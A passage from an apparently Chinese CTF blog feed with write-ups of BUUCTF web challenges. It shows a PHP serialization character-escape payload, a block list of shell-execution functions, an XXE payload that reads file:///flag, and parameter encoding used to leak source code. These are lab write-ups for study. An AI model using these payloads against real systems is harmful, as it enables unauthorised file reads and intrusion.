(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_FILES[&#39;photo&#39;];</span><br><span class="line">if ($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)</span><br><span class="line">die(&#39;Photo size error&#39;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]));</span><br><span class="line">$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];</span><br><span class="line">$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];</span><br><span class="line">$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];</span><br><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们已经登录了，非常容易地就满足了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br></pre></td></tr></table></figure><p>几个变量值都为POST传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br></pre></td></tr></table></figure><p>正则表达式判断是否为11位的数字电话号码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br></pre></td></tr></table></figure><p>这里判断了nickname是否为字符还有长度是否超过10</p><p>用文章开头的知识点二，如果我们传入的nickname是一个数组</p><p>绕过长度的限制，则可以绕过这正则表达式，使得我们不会die出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure><h5 id="照搬大佬思路："><a href="#照搬大佬思路：" class="headerlink" title=" 照搬大佬思路："></a> 照搬大佬思路：</h5><p>在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。</p><p> 我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">$username &#x3D; parent::filter($username);</span><br><span class="line">$new_profile &#x3D; parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;</span><br><span class="line">return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们再继续追寻下去<br>filter()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>update()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function update($table, $key, $value, $where) &#123;</span><br><span class="line">$sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;</span><br><span class="line">return mysql_query($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p><h5 id="反序列化字符逃逸知识补充"><a href="#反序列化字符逃逸知识补充" class="headerlink" title="反序列化字符逃逸知识补充"></a>反序列化字符逃逸知识补充</h5><ul><li>PHP反序列化字符逃逸<br>举个小例子<br>序列化</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(49) &quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot; </span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(4) &quot;defg&quot; &#125; </span><br></pre></td></tr></table></figure><p>  我们可以看到在后端中，反序列化是一”;}结束的，如果我们把”;}带入需要反序列化的字符串中（除了结尾处），是不是就能让反序列化提前结束后面的内容就丢弃了呢？<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”;}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(5) &quot;qwert&quot; &#125; </span><br></pre></td></tr></table></figure><p>成功的反序列化出我们自己定义的内容，丢弃了原先的内容（i:2;s:4:”defg”）<br>反序列化字符逃逸就先介绍到这里，我们回过头来看一下题</p><ul><li>突破口<br>我们发现一个问题，我们反序列化字符逃逸，首先序列化的字符是可控的，还有前面的长度是可控的。但update.php将参数序列化，我们可控变量的长度就已经写死了，怎么才能去控制呢。这道题的突破口其实就是序列化过后数据过滤替换那里，看似更加安全，其实更加危险。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;过滤函数</span><br><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。剩下的字符串我们构造成class.php因为里面包含了flag，并且让他在photo位置上，然后把photo给扔掉，这样在profile.php中读取的photo就是我们构造的config.php了，也就是读取到了flag<br>  简单说就是利用后端的函数替换，导致实际长度增加，增加的部分（config.php）被挤了出来，到了photo的位置上，然后闭合。<br>  再举个例方便大家理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$a &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>abc前面的s:3:不变，因为是序列化的时候固定了<br>我们将abc构造成：abc”;i:2;s:5:”qwert”;}我们再最后构造了一个闭合，导致defg被丢弃，qwert占用了defg原本的位置<br>  还是回到这一道题上，我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了。where会替换成hacker，长度加1，所以我们要构造34个where。然后去profile.php查看读取的内容。</p><h5 id="解题继续"><a href="#解题继续" class="headerlink" title="解题继续"></a>解题继续</h5><p>nickname传入，并且nickname要改成nickname[]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/17/buu/12/image-20210817203900289.png" alt="image-20210817203900289"></p><p>上传成功，去访问profile.php</p><p><img src="/2021/08/17/buu/12/image-20210817204106098.png" alt="image-20210817204106098"></p><hr><p><img src="/2021/08/17/buu/12/image-20210817204134202.png" alt="image-20210817204134202"></p><p>解码一下</p><p><img src="/2021/08/17/buu/12/image-20210817204228388.png" alt="image-20210817204228388"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;h5 id=&quot;信息泄露&quot;&gt;&lt;a href=&quot;#信息泄露&quot; class=&quot;headerl</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb&amp;NCTF2019 Fake XML cookbook</title>
    <link href="http://daweitech.github.io/2021/08/11/buu/11/"/>
    <id>http://daweitech.github.io/2021/08/11/buu/11/</id>
    <published>2021-08-11T11:33:11.000Z</published>
    <updated>2021-08-24T12:27:17.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h3><p>XML可能存在的漏洞:<br>XML注入和XPath注入XML 外部实体注入</p><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p><p><strong>XXE攻击</strong><br>附上链接：</p><p><a href="https://xz.aliyun.com/t/6887**%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E">https://xz.aliyun.com/t/6887**从XML相关一步一步到XXE漏洞</a>**</p><p>XXE(XML External Entity Injection)全称为XML外部实体注入</p><p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a><strong>浅谈XML实体注入漏洞</strong></p><h3 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h3><h4 id="网鼎杯-2020-朱雀组"><a href="#网鼎杯-2020-朱雀组" class="headerlink" title="网鼎杯 2020 朱雀组"></a>网鼎杯 2020 朱雀组</h4><p><img src="/2021/08/11/buu/11/image-20210811193932874.png" alt="image-20210811193932874"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result &#x3D; call_user_func($func, $p);</span><br><span class="line">        $a&#x3D; gettype($result);</span><br><span class="line">        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func &#x3D; &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">    if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/buu/11/image-20210811194437549.png" alt="image-20210811194437549"></p><h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="NCTF2019 Fake XML cookbook"></a>NCTF2019 Fake XML cookbook</h4><p>这题解题挺快的，有点像之前的sql注入</p><p>这次是进行恶意实体注入</p><p><img src="/2021/08/11/buu/11/image-20210812153137919.png" alt="image-20210812153137919"></p><p>尝试admin，抓个包</p><p><img src="/2021/08/11/buu/11/image-20210812153237740.png" alt="image-20210812153237740"></p><p>看到了POST提交数据后的页面</p><p>我们查看无输入数据的页面源代码</p><p>找到关键代码段</p><p><img src="/2021/08/11/buu/11/image-20210812153441742.png" alt="image-20210812153441742"></p><pre><code>function doLogin()&#123;    var username = $(&quot;#username&quot;).val();    var password = $(&quot;#password&quot;).val();    if(username == &quot;&quot; || password == &quot;&quot;)&#123;        alert(&quot;Please enter the username and password!&quot;);        return;    &#125;var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax(&#123;    type: &quot;POST&quot;,    url: &quot;doLogin.php&quot;,    contentType: &quot;application/xml;charset=utf-8&quot;,    data: data,    dataType: &quot;xml&quot;,    anysc: false,    success: function (result) &#123;        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;        if(code == &quot;0&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);        &#125;else if(code == &quot;1&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);        &#125;else&#123;            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);        &#125;    &#125;,    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);    &#125;&#125;); &#125;</code></pre><p><strong>摘抄：</strong></p><p><strong>XML可能存在的漏洞：</strong><br>XML注入和XPath注入XML 外部实体注入</p><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p><p><strong>XXE攻击</strong><br>附上链接：</p><p><a href="https://xz.aliyun.com/t/6887">https://xz.aliyun.com/t/6887</a></p><p>XXE(XML External Entity Injection)全称为XML外部实体注入</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/buu/11/image-20210812154303323.png" alt="image-20210812154303323"></p><h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p> <a href="https://blog.csdn.net/devilare/article/details/118969558">NCTF2019]Fake XML cookbook_devilare的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/SopRomeo/article/details/105913611">NCTF2019]Fake XML cookbook_SopRomeo的博客-CSDN博客</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12323562.html">NCTF2019]Fake XML cookbook - 王叹之 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h3&gt;&lt;p&gt;XML可能存在的漏洞:&lt;br&gt;XML注入和XPath注入XML 外部实体注入&lt;/p&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <link href="http://daweitech.github.io/2021/08/08/buu/10/"/>
    <id>http://daweitech.github.io/2021/08/08/buu/10/</id>
    <published>2021-08-08T13:33:02.000Z</published>
    <updated>2021-08-24T13:41:24.259Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h5 id="MD5碰撞的一些例子"><a href="#MD5碰撞的一些例子" class="headerlink" title="MD5碰撞的一些例子"></a>MD5碰撞的一些例子</h5><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p><h5 id="PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题"><a href="#PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题" class="headerlink" title="PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题"></a>PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</h5><p><a href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p><p><img src="/2021/08/08/buu/10/image-20210809085159186.png" alt="image-20210809085159186"></p><p>观察到url路径存在参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure><p>感觉这里就是切入点，img背后的似乎是base64码</p><p>在线解码一下（<a href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/）：</a></p><p>TXpVek5UTTFNbVUzTURabE5qYz0</p><p>MzUzNTM1MmU3MDZlNjc=</p><p>3535352e706e67</p><p>连续两次base64解码后，得到一串字符串</p><p>查了资料，这是hex编码</p><p><img src="/2021/08/08/buu/10/image-20210809085725782.png" alt="image-20210809085725782"></p><p>再次解码：得到555.png，有意思</p><p>刚好靶机页面上就有一张哭泣图片</p><p>我们猜测，img后面的多次编码的参数请求可以得到源码</p><p>按照上面的解码逆推编码，可以得到</p><p>index.php:</p><p>696E6465782E706870</p><p>Njk2RTY0NjU3ODJFNzA2ODcw</p><p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p><p>将参数修改</p><p><img src="/2021/08/08/buu/10/image-20210809090352667.png" alt="image-20210809090352667"></p><p>f12查看</p><p><img src="/2021/08/08/buu/10/image-20210809090426959.png" alt="image-20210809090426959"></p><p>对base64解码得到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if 